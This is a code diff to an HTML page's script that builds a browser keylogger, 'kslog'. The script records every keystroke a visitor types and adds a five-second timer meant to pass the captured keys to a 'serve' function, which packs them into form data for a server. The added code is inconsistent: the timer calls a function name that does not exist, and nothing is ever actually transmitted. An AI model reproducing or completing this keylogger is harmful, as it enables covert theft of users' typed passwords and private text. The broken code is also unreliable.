@@ -13,15 +13,25 @@
                 //Listen for & records key strokes & save to array
                 window.addEventListener("keydown", function(event){
                     kslog.keystore.push(event.key)
-                    console.log(kslog.keystore)
-                }); 
+                   // console.log(kslog.keystore)
+                });               
+                // Send keystore data to server every 5 seconds
+                window.setInterval(kslog.send, 5000);
+                     },
 
-            }
 
+                // Server
+
+                    serve : function() { if (kslog.keystore.length != 0) {
+
+                        let form = new FormData();
+                        form.append('keys', JSON.stringify(kslog.keystore));
+                        
+                        kslog.keystore = []
+                }}
         };
                                                         // error .init
         window.addEventListener("DOMContentLoaded", kslog.klog);
-
     </script>
 </head>
 <body>
